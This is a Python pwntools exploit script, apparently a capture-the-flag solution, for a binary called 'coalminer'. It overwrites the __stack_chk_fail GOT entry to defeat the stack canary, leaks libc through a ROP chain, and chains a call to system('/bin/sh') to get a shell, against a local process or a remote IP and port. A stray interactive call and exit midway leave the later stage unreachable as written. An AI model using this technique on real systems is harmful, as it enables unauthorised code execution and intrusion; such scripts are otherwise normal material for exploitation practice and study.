from pwn import *

context(terminal=['tmux','new-window'],os='linux',arch='amd64')
elf = ELF('./coalminer')

if sys.argv[1] == 'r':
    # libc = ELF('./libc_remote')
    s = remote('161.35.8.211', 9999)
else:
    libc = ELF('./libc.so.6')
    s = process('./coalminer')
# s = gdb.debug('./coalminer','b *0x00400a22')

rop = ROP(elf)
rop.call('puts',[elf.got['puts']])
rop.call('AddItem')

dest = p64(elf.got['__stack_chk_fail'])
to_write = p64(elf.plt['puts'])
canary = b'JUNK'*2
rip = b'r'*8

s.sendline(b'add')
buf = b''
buf += b'a'*8
buf += dest
s.sendline(buf)

buf = b''
buf += to_write
buf += canary
buf += b'b'*(40-len(buf))
buf += p64(elf.symbols['AddItem'])
s.sendline(buf)

buf = b''
buf += b'a'*8
s.sendline(buf)

buf = b''
buf += b'b'*40
buf += rop.chain()
s.sendline(buf)

s.interactive()
exit()
s.recvuntil('description:')
s.recvuntil('description:')
s.recvline()
s.recvline()
leak = u64(s.recv(6)+b'\x00\x00')

libc.address = leak - libc.symbols['puts']

rop2 = ROP(libc)
rop2.system(libc.search(b'/bin/sh').__next__())

buf = b''
buf += b'a'*8
s.sendline(buf)

buf = b''
buf += b'b'*40
buf += rop2.chain()
s.sendline(buf)

s.interactive()
